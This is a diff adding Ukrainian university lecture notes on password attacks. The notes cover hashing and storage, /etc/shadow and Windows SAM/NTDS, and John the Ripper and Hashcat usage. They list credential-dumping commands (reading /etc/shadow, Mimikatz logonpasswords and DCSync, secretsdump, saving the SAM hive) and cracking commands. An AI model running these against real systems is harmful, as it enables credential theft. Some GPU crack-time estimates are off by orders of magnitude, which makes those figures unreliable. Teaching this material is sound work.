@@ -3,8 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="description" content="Конспект лекції 6: Брутфорс та атаки на паролі — повний текст.">
-  <meta name="author" content="Кафедра інформатики та фізико-математичних дисциплін, УжНУ">
+  <meta name="description" content="Конспект лекції 6: Брутфорс та атаки на паролі — словникові атаки, хешування, Hashcat, John the Ripper, Hydra, wordlists, Wi-Fi, credential stuffing, захист паролів.">
+  <meta name="author" content="Кафедра ТЕІБ, УжНУ">
   <meta name="theme-color" content="#0ea5e9">
   <title>Конспект | Лекція 6. Брутфорс та атаки на паролі</title>
   <link rel="icon" type="image/svg+xml" href="../img/favicon.svg">
@@ -69,18 +69,1568 @@
       <h1>Брутфорс та атаки на паролі</h1>
       <div class="lecture-info">
         <span><svg viewBox="0 0 24 24" width="14" height="14" fill="none" stroke="currentColor" stroke-width="2" style="vertical-align: -2px; margin-right: 4px;"><circle cx="12" cy="12" r="10"/><path d="M12 6v6l4 2"/></svg>2 год</span>
-        <span class="badge badge-locked">Скоро</span>
+        <span class="badge badge-new">Нова</span>
       </div>
 
+      <!-- ============================================================ -->
+      <!-- 6.1 Вступ до атак на паролі                                  -->
+      <!-- ============================================================ -->
       <section>
-        <p>Матеріали цього конспекту готуються. Слідкуйте за оновленнями.</p>
+        <h2>6.1 Вступ до атак на паролі</h2>
+
+        <p>Паролі залишаються <strong>основним механізмом автентифікації</strong> у переважній більшості інформаційних систем. Незважаючи на розвиток біометрії, токенів та безпарольної автентифікації, паролі використовуються для захисту облікових записів у 80%+ сервісів. Саме тому атаки на паролі є одним із найпоширеніших та найефективніших векторів компрометації.</p>
+
+        <p>За даними звіту <strong>Verizon Data Breach Investigations Report (DBIR) 2024</strong>, скомпрометовані облікові дані (stolen credentials) були задіяні у <strong>81% зламів</strong>, пов'язаних із хакерськими атаками. Це робить паролі вразливістю номер один у корпоративній безпеці.</p>
+
+        <h3>Класифікація атак на паролі</h3>
+        <p>Атаки на паролі можна класифікувати за кількома критеріями:</p>
+        <table>
+          <tr>
+            <th>Критерій</th>
+            <th>Тип</th>
+            <th>Опис</th>
+          </tr>
+          <tr>
+            <td rowspan="2"><strong>За вектором</strong></td>
+            <td>Онлайн-атака</td>
+            <td>Спроби автентифікації через мережевий сервіс (SSH, HTTP, FTP). Обмежена швидкістю відповіді сервера та механізмами блокування</td>
+          </tr>
+          <tr>
+            <td>Офлайн-атака</td>
+            <td>Зламування хешів паролів, отриманих із бази даних або файлової системи. Обмежена лише обчислювальними ресурсами атакуючого</td>
+          </tr>
+          <tr>
+            <td rowspan="6"><strong>За методом</strong></td>
+            <td>Brute-force (повний перебір)</td>
+            <td>Перебір усіх можливих комбінацій символів. Гарантовано знаходить пароль, але потребує значних ресурсів</td>
+          </tr>
+          <tr>
+            <td>Dictionary (словникова)</td>
+            <td>Перебір слів із підготовленого словника. Швидка, але знаходить лише паролі, присутні у словнику</td>
+          </tr>
+          <tr>
+            <td>Hybrid (гібридна)</td>
+            <td>Комбінація словника з правилами мутації: додавання цифр, зміна регістру, leet-speak</td>
+          </tr>
+          <tr>
+            <td>Rule-based (на основі правил)</td>
+            <td>Застосування трансформаційних правил до базових слів (Hashcat/JtR rules)</td>
+          </tr>
+          <tr>
+            <td>Rainbow Tables</td>
+            <td>Використання попередньо обчислених таблиць хеш-пароль. Time-memory tradeoff</td>
+          </tr>
+          <tr>
+            <td>Credential Stuffing</td>
+            <td>Використання пар email:password із витоків даних проти інших сервісів</td>
+          </tr>
+        </table>
+
+        <h3>Credential Stuffing vs Password Spraying</h3>
+        <p>Два найпоширеніші типи мережевих атак на паролі принципово відрізняються підходом:</p>
+        <table>
+          <tr>
+            <th>Параметр</th>
+            <th>Credential Stuffing</th>
+            <th>Password Spraying</th>
+          </tr>
+          <tr>
+            <td><strong>Підхід</strong></td>
+            <td>Багато паролів для кожного акаунту</td>
+            <td>Один пароль для багатьох акаунтів</td>
+          </tr>
+          <tr>
+            <td><strong>Джерело</strong></td>
+            <td>Витоки даних (breaches)</td>
+            <td>Загальні/типові паролі</td>
+          </tr>
+          <tr>
+            <td><strong>Ціль</strong></td>
+            <td>Повторне використання паролів</td>
+            <td>Обхід політик блокування</td>
+          </tr>
+          <tr>
+            <td><strong>Детальніше</strong></td>
+            <td>Розділ 6.7</td>
+            <td>Розділ 6.7</td>
+          </tr>
+        </table>
+
+        <h3>Стандарт NIST SP 800-63B</h3>
+        <p><strong>NIST SP 800-63B</strong> (Digital Identity Guidelines: Authentication and Lifecycle Management) — основний стандарт для вимог до автентифікації, оновлений у 2024 році. Ключові рекомендації:</p>
+        <ul>
+          <li>Мінімальна довжина пароля — <strong>8 символів</strong>, рекомендована — <strong>12+</strong></li>
+          <li><strong>Не вимагати</strong> обов'язкової зміни пароля через фіксований період (якщо немає ознак компрометації)</li>
+          <li><strong>Не вимагати</strong> обов'язкового поєднання великих літер, цифр та спецсимволів (composition rules)</li>
+          <li>Перевіряти паролі проти списків скомпрометованих (breach lists)</li>
+          <li>Дозволяти всі друковані символи, включаючи пробіли</li>
+          <li>Обов'язково використовувати <strong>MFA</strong> для чутливих систем</li>
+        </ul>
+
+        <h3>Статистика паролів</h3>
+        <ul>
+          <li>Понад <strong>10 мільярдів</strong> облікових записів скомпрометовано у відомих витоках даних (Have I Been Pwned, 2024)</li>
+          <li><strong>65%</strong> користувачів повторно використовують паролі на різних сервісах (Google Security Survey, 2023)</li>
+          <li>Середній користувач має <strong>100+</strong> облікових записів, але використовує лише <strong>5-7 унікальних паролів</strong></li>
+          <li>Середній час зламу 8-символьного пароля (a-z, GPU RTX 4090): <strong>менше 1 хвилини</strong> для MD5</li>
+        </ul>
+        <p>Найпоширеніші паролі у витоках даних:</p>
+        <table>
+          <tr>
+            <th>#</th>
+            <th>Пароль</th>
+            <th>Кількість використань</th>
+          </tr>
+          <tr><td>1</td><td><code>123456</code></td><td>~23 млн</td></tr>
+          <tr><td>2</td><td><code>password</code></td><td>~9 млн</td></tr>
+          <tr><td>3</td><td><code>123456789</code></td><td>~7.7 млн</td></tr>
+          <tr><td>4</td><td><code>12345678</code></td><td>~5.5 млн</td></tr>
+          <tr><td>5</td><td><code>qwerty</code></td><td>~4.9 млн</td></tr>
+          <tr><td>6</td><td><code>1234567890</code></td><td>~3.8 млн</td></tr>
+          <tr><td>7</td><td><code>12345</code></td><td>~3.5 млн</td></tr>
+          <tr><td>8</td><td><code>111111</code></td><td>~3.1 млн</td></tr>
+          <tr><td>9</td><td><code>1234567</code></td><td>~2.9 млн</td></tr>
+          <tr><td>10</td><td><code>abc123</code></td><td>~2.8 млн</td></tr>
+        </table>
+
+        <h3>Правові аспекти</h3>
+        <p>Атаки на паролі, як і будь-які інші методи пентесту, є <strong>законними лише за наявності письмової авторизації</strong>. Необхідні документи:</p>
+        <ul>
+          <li><strong>Rules of Engagement (RoE)</strong> — чітко визначений scope: які системи, акаунти та сервіси дозволено тестувати</li>
+          <li><strong>Обмеження інтенсивності</strong> — максимальна кількість спроб, часові вікна, щоб не спричинити DoS або масове блокування облікових записів</li>
+          <li><strong>Кримінальний кодекс України, ст. 361</strong> — несанкціоноване втручання в роботу комп'ютерних систем (до 6 років ув'язнення)</li>
+          <li><strong>CFAA (Computer Fraud and Abuse Act, США)</strong> — несанкціонований доступ до комп'ютерних систем</li>
+        </ul>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.2 Механізми автентифікації та зберігання паролів            -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.2 Механізми автентифікації та зберігання паролів</h2>
+
+        <p>Щоб ефективно атакувати паролі, пентестер повинен розуміти, <strong>як саме системи зберігають та перевіряють паролі</strong>. Сучасні системи ніколи не зберігають паролі у відкритому вигляді (plaintext) — замість цього використовуються <strong>хеш-функції</strong>.</p>
+
+        <h3>Як працює хешування</h3>
+        <p><strong>Хеш-функція</strong> — це одностороння математична функція, що перетворює вхідні дані довільної довжини у вихідний рядок фіксованої довжини (хеш, дайджест). Ключові властивості:</p>
+        <ul>
+          <li><strong>Односторонність</strong> — неможливо відновити оригінальний пароль із хешу (за розумний час)</li>
+          <li><strong>Детермінованість</strong> — однакові вхідні дані завжди дають однаковий хеш</li>
+          <li><strong>Фіксована довжина</strong> — незалежно від довжини вхідних даних, хеш має фіксований розмір</li>
+          <li><strong>Лавинний ефект</strong> — мінімальна зміна вхідних даних кардинально змінює хеш</li>
+          <li><strong>Стійкість до колізій</strong> — практично неможливо знайти два різні входи з однаковим хешем</li>
+        </ul>
+        <pre><code># Приклад хешування SHA-256
+echo -n "password"  | sha256sum
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+
+echo -n "password1" | sha256sum
+0b14d501a594442a01c6859541bcb3e8164d183d32937b851835442f69d5c94e
+# Повністю різний хеш при зміні лише одного символу!</code></pre>
+
+        <h3>Порівняння хеш-функцій</h3>
+        <table>
+          <tr>
+            <th>Алгоритм</th>
+            <th>Розмір (біт)</th>
+            <th>Статус</th>
+            <th>Призначення</th>
+            <th>Швидкість (RTX 4090)</th>
+          </tr>
+          <tr>
+            <td><strong>MD5</strong></td>
+            <td>128</td>
+            <td>Зламаний (колізії з 2004)</td>
+            <td>Контрольні суми, legacy-системи</td>
+            <td>~164 GH/s</td>
+          </tr>
+          <tr>
+            <td><strong>SHA-1</strong></td>
+            <td>160</td>
+            <td>Зламаний (SHAttered, 2017)</td>
+            <td>Legacy, Git (переходить на SHA-256)</td>
+            <td>~24 GH/s</td>
+          </tr>
+          <tr>
+            <td><strong>SHA-256</strong></td>
+            <td>256</td>
+            <td>Безпечний</td>
+            <td>Цифрові підписи, TLS, Bitcoin</td>
+            <td>~22 GH/s</td>
+          </tr>
+          <tr>
+            <td><strong>SHA-512</strong></td>
+            <td>512</td>
+            <td>Безпечний</td>
+            <td>Linux /etc/shadow ($6$)</td>
+            <td>~3.5 GH/s</td>
+          </tr>
+          <tr>
+            <td><strong>bcrypt</strong></td>
+            <td>184</td>
+            <td>Рекомендований</td>
+            <td>Зберігання паролів (cost factor)</td>
+            <td>~184 KH/s</td>
+          </tr>
+          <tr>
+            <td><strong>Argon2id</strong></td>
+            <td>Конфігуроване</td>
+            <td>Найкращий (PHC 2015)</td>
+            <td>Зберігання паролів (memory-hard)</td>
+            <td>~1000 H/s</td>
+          </tr>
+        </table>
+        <p><strong>Зверніть увагу</strong> на різницю у швидкості: MD5 обчислюється в <strong>164 мільярди</strong> разів на секунду, тоді як Argon2id — лише приблизно <strong>1000</strong> разів. Це означає, що bcrypt/Argon2id спеціально спроєктовані бути <em>повільними</em> для захисту від брутфорсу.</p>
+
+        <h3>Сіль (Salt)</h3>
+        <p><strong>Сіль</strong> — це випадкові дані, що додаються до пароля перед хешуванням. Кожен користувач має <strong>унікальну</strong> сіль.</p>
+        <pre><code># Без солі: однакові паролі = однакові хеші
+hash("password") = 5e884898da2804...
+hash("password") = 5e884898da2804...  # Ідентичний!
+
+# З сіллю: однакові паролі = різні хеші
+hash("aB9x" + "password") = 7c6a180b36896a...
+hash("kM3p" + "password") = 2b6d36f83c28e1...  # Різні!</code></pre>
+        <p>Переваги використання солі:</p>
+        <ul>
+          <li><strong>Захист від rainbow tables</strong> — для кожної солі потрібна окрема таблиця</li>
+          <li><strong>Захист від порівняння хешів</strong> — два однакові паролі матимуть різні хеші</li>
+          <li><strong>Сповільнення масового зламу</strong> — кожен хеш потрібно ламати окремо</li>
+        </ul>
+
+        <h3>Key Stretching (розтягування ключа)</h3>
+        <p>Key stretching — це техніка багаторазового застосування хеш-функції для штучного сповільнення обчислення:</p>
+        <ul>
+          <li><strong>PBKDF2</strong> — Password-Based Key Derivation Function 2. Рекомендовано <strong>600,000+ ітерацій</strong> для SHA-256 (OWASP 2024)</li>
+          <li><strong>bcrypt</strong> — використовує cost factor (log2 кількості ітерацій). Cost 12 = 2^12 = 4096 ітерацій. Рекомендовано cost &ge; 12</li>
+          <li><strong>scrypt</strong> — memory-hard функція: потребує значних обсягів оперативної пам'яті, ускладнюючи GPU-атаки</li>
+          <li><strong>Argon2id</strong> — переможець Password Hashing Competition (PHC) 2015. Поєднує стійкість до GPU (memory-hard) та side-channel атак. Параметри: пам'ять, ітерації, паралелізм</li>
+        </ul>
+
+        <h3>Pepper (перець)</h3>
+        <p><strong>Pepper</strong> — це секретний ключ на стороні сервера, що додається до пароля перед хешуванням. На відміну від солі, pepper <strong>не зберігається разом із хешем</strong> — він зберігається окремо (наприклад, у змінних середовища або HSM). Навіть якщо база даних з хешами та солями скомпрометована, без pepper'у атакуючий не зможе зламати паролі.</p>
+
+        <h3>Linux: /etc/shadow</h3>
+        <p>В Linux паролі зберігаються у файлі <code>/etc/shadow</code>, доступному лише root. Формат запису:</p>
+        <pre><code>username:$id$salt$hash:lastchanged:min:max:warn:inactive:expire
+
+# Приклад:
+john:$6$xYz1aBcD$kL9m2nO3pQ4rS5tU6vW7xY8zA9bC0dE1fG2hI3jK4l:19500:0:99999:7:::
+
+# Пояснення:
+# $6$        — алгоритм (SHA-512)
+# xYz1aBcD   — сіль
+# kL9m2n...  — хеш
+# 19500      — дні від 1 січня 1970 до останньої зміни</code></pre>
+
+        <p>Ідентифікатори алгоритмів у /etc/shadow:</p>
+        <table>
+          <tr>
+            <th>ID</th>
+            <th>Алгоритм</th>
+            <th>Статус</th>
+          </tr>
+          <tr><td><code>$1$</code></td><td>MD5</td><td>Застарілий, небезпечний</td></tr>
+          <tr><td><code>$5$</code></td><td>SHA-256</td><td>Прийнятний</td></tr>
+          <tr><td><code>$6$</code></td><td>SHA-512</td><td>Стандарт (більшість дистрибутивів)</td></tr>
+          <tr><td><code>$2b$</code></td><td>bcrypt</td><td>Рекомендований</td></tr>
+          <tr><td><code>$y$</code></td><td>yescrypt</td><td>Сучасний (Debian 11+, Fedora 35+)</td></tr>
+        </table>
+
+        <pre><code># Корисні команди Linux
+sudo cat /etc/shadow                    # Перегляд хешів
+sudo unshadow /etc/passwd /etc/shadow   # Об'єднання для John the Ripper
+sudo chpasswd &lt;&lt;&lt; "user:newpassword"    # Зміна пароля</code></pre>
+
+        <h3>Windows: зберігання паролів</h3>
+        <p>Windows використовує кілька механізмів зберігання паролів:</p>
+
+        <p><strong>SAM (Security Account Manager)</strong> — база даних локальних облікових записів. Зберігається у <code>C:\Windows\System32\config\SAM</code>. Файл заблокований для читання під час роботи системи (процес lsass.exe тримає ексклюзивний замок).</p>
+
+        <p><strong>LM Hash (LAN Manager)</strong> — застарілий алгоритм, вимкнений за замовчуванням з Windows Vista:</p>
+        <ul>
+          <li>Базується на DES-шифруванні</li>
+          <li>Конвертує пароль у <strong>верхній регістр</strong> (case-insensitive)</li>
+          <li>Розбиває пароль на два 7-символьні блоки, кожен хешується окремо</li>
+          <li>Максимальна довжина — 14 символів</li>
+          <li><strong>Вкрай слабкий:</strong> будь-який LM hash зламується за секунди</li>
+        </ul>
+
+        <p><strong>NTLM Hash (NT LAN Manager)</strong> — основний алгоритм Windows:</p>
+        <ul>
+          <li>Формула: <code>MD4(UTF-16-LE(password))</code></li>
+          <li><strong>Не використовує сіль!</strong> — це критична слабкість</li>
+          <li>Однакові паролі дають однакові NTLM хеші на всіх Windows-системах</li>
+          <li>Швидкість зламу: RTX 4090 — ~300 GH/s (навіть швидше за MD5 через простоту MD4)</li>
+          <li>Використовується для автентифікації у мережах Windows (NTLMv1/v2, Kerberos)</li>
+        </ul>
+
+        <p><strong>NTDS.dit</strong> — база даних Active Directory, що містить хеші паролів <strong>усіх доменних користувачів</strong>. Знаходиться на контролері домену: <code>C:\Windows\NTDS\ntds.dit</code>.</p>
+
+        <h3>Інструменти дампу паролів Windows</h3>
+        <table>
+          <tr>
+            <th>Інструмент</th>
+            <th>Метод</th>
+            <th>Команда</th>
+          </tr>
+          <tr>
+            <td><strong>Mimikatz</strong></td>
+            <td>Читання пам'яті LSASS</td>
+            <td><code>sekurlsa::logonpasswords</code></td>
+          </tr>
+          <tr>
+            <td><strong>Mimikatz</strong></td>
+            <td>DCSync (імітація контролера домену)</td>
+            <td><code>lsadump::dcsync /user:Administrator</code></td>
+          </tr>
+          <tr>
+            <td><strong>Impacket secretsdump</strong></td>
+            <td>Віддалений дамп через SMB</td>
+            <td><code>secretsdump.py domain/user:pass@dc_ip</code></td>
+          </tr>
+          <tr>
+            <td><strong>reg save</strong></td>
+            <td>Збереження реєстру (SAM, SYSTEM, SECURITY)</td>
+            <td><code>reg save HKLM\SAM sam.bak</code></td>
+          </tr>
+          <tr>
+            <td><strong>fgdump / pwdump</strong></td>
+            <td>Дамп SAM через DLL injection</td>
+            <td><code>fgdump.exe</code></td>
+          </tr>
+        </table>
+
+        <h3>Зберігання паролів у веб-додатках</h3>
+        <table>
+          <tr>
+            <th>Алгоритм</th>
+            <th>Рекомендація</th>
+            <th>Коментар</th>
+          </tr>
+          <tr>
+            <td><strong>Argon2id</strong></td>
+            <td>Найкращий вибір</td>
+            <td>Memory-hard, стійкий до GPU та ASIC. Параметри: m=65536 (64 MB), t=3, p=4</td>
+          </tr>
+          <tr>
+            <td><strong>bcrypt</strong></td>
+            <td>Рекомендований</td>
+            <td>Широко підтримується. Cost factor &ge; 12. Обмеження: 72 байти вхідних даних</td>
+          </tr>
+          <tr>
+            <td><strong>scrypt</strong></td>
+            <td>Прийнятний</td>
+            <td>Memory-hard. Використовується у криптовалютах (Litecoin)</td>
+          </tr>
+          <tr>
+            <td><strong>PBKDF2</strong></td>
+            <td>Прийнятний</td>
+            <td>NIST-стандарт. SHA-256 з 600,000+ ітерацій. Не memory-hard</td>
+          </tr>
+          <tr>
+            <td><strong>SHA-256/512 (без stretching)</strong></td>
+            <td>Небезпечний для паролів</td>
+            <td>Занадто швидкий. Допустимий лише для контрольних сум</td>
+          </tr>
+          <tr>
+            <td><strong>MD5 / SHA-1</strong></td>
+            <td>Неприпустимий</td>
+            <td>Зламані алгоритми. Зустрічаються в legacy-системах</td>
+          </tr>
+        </table>
+      </section>
+
+      <!-- ============================================================ -->
+      <!-- 6.3 Офлайн-атаки: John the Ripper та Hashcat                 -->
+      <!-- ============================================================ -->
+      <section>
+        <h2>6.3 Офлайн-атаки: John the Ripper та Hashcat</h2>
+
+        <p>Офлайн-атаки — це зламування хешів паролів <strong>без взаємодії з цільовою системою</strong>. Атакуючий отримує хеші (через SQL injection, дамп бази, доступ до /etc/shadow або SAM) і зламує їх локально на своєму обладнанні. Швидкість обмежена лише обчислювальними ресурсами.</p>
+
+        <h3>John the Ripper (JtR)</h3>
+        <p><strong>John the Ripper</strong> — один із найстаріших та найвідоміших інструментів для зламування паролів. Створений <strong>Solar Designer</strong> у 1996 році. Версія <strong>Jumbo</strong> (community-enhanced) підтримує понад <strong>300 форматів хешів</strong>.</p>
+
+        <h3>Режими роботи JtR</h3>
+        <table>
+          <tr>
+            <th>Режим</th>
+            <th>Опис</th>
+            <th>Команда</th>
+          </tr>
+          <tr>
+            <td><strong>Single Crack</strong></td>
+            <td>Мутації на основі імені користувача та поля GECOS (ім'я, прізвище). Найшвидший для перших спроб</td>
+            <td><code>john --single hashes.txt</code></td>
+          </tr>
+          <tr>
+            <td><strong>Wordlist</strong></td>
+            <td>Перебір слів із файлу-словника. Може застосовувати правила мутації</td>
+            <td><code>john --wordlist=rockyou.txt hashes.txt</code></td>
+          </tr>
+          <tr>
+            <td><strong>Incremental</strong></td>
+            <td>Повний перебір усіх комбінацій за заданим набором символів</td>
+            <td><code>john --incremental=Alnum hashes.txt</code></td>
+          </tr>
+          <tr>
+            <td><strong>External</strong></td>
+            <td>Користувацький режим з C-подібними модулями</td>
+            <td><code>john --external=Filter hashes.txt</code></td>
+          </tr>
+        </table>
+
+        <h3>Основні команди JtR</h3>
+        <pre><code># Базовий запуск (автовизначення формату та режимів)
+john hashes.txt
+
+# Словникова атака
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+
+# Словникова атака з правилами мутації
+john --wordlist=rockyou.txt --rules=best64 hashes.txt
+
+# Brute-force (incremental) тільки з маленькими латинськими
+john --incremental=Lower hashes.txt
+
+# Brute-force тільки з цифрами
+john --incremental=Digits hashes.txt
+
+# Вказати формат хешу
+john --format=raw-md5 hashes.txt
+john --format=raw-sha256 hashes.txt
+john --format=NT hashes.txt
+
+# Показати зламані паролі
+john --show hashes.txt
+
+# Показати стан (під час роботи натиснути Enter)
+john --status
+
+# Відновити перервану сесію
+john --restore</code></pre>
+
+        <h3>Утиліти *2john</h3>
+        <p>John the Ripper включає десятки утиліт для вилучення хешів із різних форматів файлів:</p>
+        <table>
+          <tr>
+            <th>Утиліта</th>
+            <th>Призначення</th>
+            <th>Команда</th>
+          </tr>
+          <tr>
+            <td><code>zip2john</code></td>
+            <td>Захищені ZIP-архіви</td>
+            <td><code>zip2john protected.zip &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>rar2john</code></td>
+            <td>Захищені RAR-архіви</td>
+            <td><code>rar2john protected.rar &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>pdf2john</code></td>
+            <td>Захищені PDF-документи</td>
+            <td><code>pdf2john protected.pdf &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>office2john</code></td>
+            <td>Захищені Office-документи</td>
+            <td><code>office2john protected.docx &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>ssh2john</code></td>
+            <td>Приватні SSH-ключі</td>
+            <td><code>ssh2john id_rsa &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>keepass2john</code></td>
+            <td>Бази KeePass (.kdbx)</td>
+            <td><code>keepass2john database.kdbx &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>bitlocker2john</code></td>
+            <td>Шифрування BitLocker</td>
+            <td><code>bitlocker2john -i image.raw &gt; hash.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>wpapcap2john</code></td>
+            <td>WPA/WPA2 handshake (pcap)</td>
+            <td><code>wpapcap2john capture.pcap &gt; hash.txt</code></td>
+          </tr>
+        </table>
+
+        <h3>Hashcat</h3>
+        <p><strong>Hashcat</strong> — найшвидший у світі інструмент для зламування паролів, що використовує <strong>GPU-прискорення</strong> (CUDA, OpenCL, Metal). Підтримує понад <strong>350 алгоритмів хешування</strong>. Ключова перевага — масивний паралелізм GPU: одна відеокарта RTX 4090 обчислює мільярди хешів на секунду.</p>
+
+        <h3>Режими атак Hashcat</h3>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Режим</th>
+            <th>Опис</th>
+            <th>Приклад</th>
+          </tr>
+          <tr>
+            <td><code>-a 0</code></td>
+            <td>Dictionary</td>
+            <td>Перебір слів із словника</td>
+            <td><code>hashcat -a 0 -m 0 hashes.txt rockyou.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-a 1</code></td>
+            <td>Combinator</td>
+            <td>Комбінація двох словників: word1+word2</td>
+            <td><code>hashcat -a 1 -m 0 hashes.txt dict1.txt dict2.txt</code></td>
+          </tr>
+          <tr>
+            <td><code>-a 3</code></td>
+            <td>Brute-force / Mask</td>
+            <td>Перебір за маскою (шаблоном)</td>
+            <td><code>hashcat -a 3 -m 0 hashes.txt ?l?l?l?l?d?d</code></td>
+          </tr>
+          <tr>
+            <td><code>-a 6</code></td>
+            <td>Hybrid (wordlist+mask)</td>
+            <td>Слово + маска: password?d?d</td>
+            <td><code>hashcat -a 6 -m 0 hashes.txt dict.txt ?d?d</code></td>
+          </tr>
+          <tr>
+            <td><code>-a 7</code></td>
+            <td>Hybrid (mask+wordlist)</td>
+            <td>Маска + слово: ?d?dpassword</td>
+            <td><code>hashcat -a 7 -m 0 hashes.txt ?d?d dict.txt</code></td>
+          </tr>
+        </table>
+
+        <h3>Маски (charset) Hashcat</h3>
+        <table>
+          <tr>
+            <th>Маска</th>
+            <th>Набір символів</th>
+            <th>Приклад</th>
+          </tr>
+          <tr><td><code>?l</code></td><td>a-z (маленькі латинські)</td><td><code>?l?l?l?l</code> = aaaa..zzzz</td></tr>
+          <tr><td><code>?u</code></td><td>A-Z (великі латинські)</td><td><code>?u?l?l?l</code> = Aaaa..Zzzz</td></tr>
+          <tr><td><code>?d</code></td><td>0-9 (цифри)</td><td><code>?d?d?d?d</code> = 0000..9999</td></tr>
+          <tr><td><code>?s</code></td><td>Спеціальні символи (!@#$...)</td><td><code>?l?l?l?s</code> = aaa!..zzz~</td></tr>
+          <tr><td><code>?a</code></td><td>Усі друковані ASCII</td><td><code>?a?a?a?a</code> = всі 4-символьні</td></tr>
+          <tr><td><code>?1</code>-<code>?4</code></td><td>Кастомний набір (-1 aA1!)</td><td><code>-1 ?l?u ?1?1?1?d</code></td></tr>
+        </table>
+
+        <h3>Основні режими хешів Hashcat (-m)</h3>
+        <table>
+          <tr>
+            <th>Прапорець</th>
+            <th>Алгоритм</th>
+            <th>Приклад використання</th>
+          </tr>
+          <tr><td><code>-m 0</code></td><td>MD5</td><td>Веб-додатки, legacy-системи</td></tr>
+          <tr><td><code>-m 100</code></td><td>SHA-1</td><td>Legacy-системи, Git</td></tr>
+          <tr><td><code>-m 1000</code></td><td>NTLM</td><td>Windows паролі (SAM, NTDS.dit)</td></tr>
+          <tr><td><code>-m 1400</code></td><td>SHA-256</td><td>Сучасні веб-додатки</td></tr>
+          <tr><td><code>-m 1700</code></td><td>SHA-512</td><td>Сучасні системи</td></tr>
+          <tr><td><code>-m 1800</code></td><td>sha512crypt ($6$)</td><td>Linux /etc/shadow</td></tr>
+          <tr><td><code>-m 3200</code></td><td>bcrypt ($2*$)</td><td>Веб-додатки, Ruby, PHP</td></tr>
+          <tr><td><code>-m 5600</code></td><td>NetNTLMv2</td><td>Windows мережева автентифікація</td></tr>
+          <tr><td><code>-m 13100</code></td><td>Kerberos TGS-REP (Kerberoasting)</td><td>Active Directory</td></tr>
+          <tr><td><code>-m 22000</code></td><td>WPA-PBKDF2-PMKID+EAPOL</td><td>Wi-Fi WPA/WPA2</td></tr>
+          <tr><td><code>-m 13400</code></td><td>KeePass 1/2 AES/Twofish</td><td>Бази паролів KeePass</td></tr>
+        </table>
+
+        <h3>Правила мутації Hashcat</h3>
+        <table>
+          <tr>
+            <th>Правило</th>
+            <th>Опис</th>
+            <th>Приклад: "password"</th>
+          </tr>
+          <tr><td><code>c</code></td><td>Capitalize (перша велика)</td><td>Password</td></tr>
+          <tr><td><code>u</code></td><td>UPPERCASE (усі великі)</td><td>PASSWORD</td></tr>
+          <tr><td><code>l</code></td><td>lowercase (усі маленькі)</td><td>password</td></tr>
+          <tr><td><code>$1</code></td><td>Додати символ у кінець</td><td>password1</td></tr>
+          <tr><td><code>^!</code></td><td>Додати символ на початок</td><td>!password</td></tr>
+          <tr><td><code>sa@</code></td><td>Замінити a на @</td><td>p@ssword</td></tr>
+          <tr><td><code>se3</code></td><td>Замінити e на 3</td><td>password (без змін, немає e)</td></tr>
+          <tr><td><code>d</code></td><td>Дублювати слово</td><td>passwordpassword</td></tr>
+          <tr><td><code>r</code></td><td>Реверс</td><td>drowssap</td></tr>
+        </table>
+
+        <p>Популярні набори правил (rule files):</p>
+        <ul>
+          <li><code>best64.rule</code> — 64 найефективніші правила, оптимальне співвідношення швидкість/результат. Зламує ~70% типових паролів у комбінації з rockyou.txt</li>
+          <li><code>d3ad0ne.rule</code> — ~35,000 правил, агресивніший підхід</li>
+          <li><code>dive.rule</code> — ~99,000 правил, глибокий перебір мутацій</li>
+          <li><code>OneRuleToRuleThemAll.rule</code> — ~51,000 правил, оптимізований набір від NotSoSecure</li>
+        </ul>
+
+        <pre><code># Словникова атака з правилами
+hashcat -a 0 -m 1000 ntlm_hashes.txt rockyou.txt -r best64.rule
+
+# Mask-атака: пароль = велика + 5 маленьких + 2 цифри
+hashcat -a 3 -m 0 hashes.txt ?u?l?l?l?l?l?d?d
+
+# Гібридна: словник + 4 цифри
+hashcat -a 6 -m 0 hashes.txt rockyou.txt ?d?d?d?d
+
+# Показати зламані
+hashcat -m 0 hashes.txt --show
+
+# Benchmark (тест швидкості)
+hashcat -b -m 0     # MD5
+hashcat -b -m 1000  # NTLM
+hashcat -b -m 3200  # bcrypt</code></pre>
+
+        <h3>GPU Benchmarks (RTX 4090)</h3>
+        <table>
+          <tr>
+            <th>Алгоритм</th>
+            <th>Hashcat -m</th>
+            <th>Швидкість</th>
+            <th>8 символів (a-z)</th>
+          </tr>
+          <tr><td>MD5</td><td>0</td><td>164 GH/s</td><td>&lt; 1 секунди</td></tr>
+          <tr><td>NTLM</td><td>1000</td><td>300 GH/s</td><td>&lt; 1 секунди</td></tr>
+          <tr><td>SHA-256</td><td>1400</td><td>22 GH/s</td><td>~10 секунд</td></tr>
+          <tr><td>SHA-512</td><td>1700</td><td>3.5 GH/s</td><td>~60 секунд</td></tr>
+          <tr><td>sha512crypt</td><td>1800</td><td>1.8 MH/s</td><td>~32 роки</td></tr>
+          <tr><td>bcrypt (cost 12)</td><td>3200</td><td>184 KH/s</td><td>~330 років</td></tr>
+          <tr><td>Argon2id</td><td>-</td><td>~1 KH/s</td><td>~6.6 млн років</td></tr>
+        </table>
+
+        <h3>Практичний workflow зламування</h3>
+        <ol>
+          <li><strong>Ідентифікація формату:</strong> використати <code>hashid</code> або <code>hash-identifier</code> для визначення типу хешу</li>
+          <li><strong>Словникова атака:</strong> <code>hashcat -a 0 -m MODE hashes.txt rockyou.txt</code></li>
+          <li><strong>Словник + правила:</strong> <code>hashcat -a 0 -m MODE hashes.txt rockyou.txt -r best64.rule</code></li>
+          <li><strong>Гібридна:</strong> <code>hashcat -a 6 -m MODE hashes.txt rockyou.txt ?d?d?d?d</code></li>
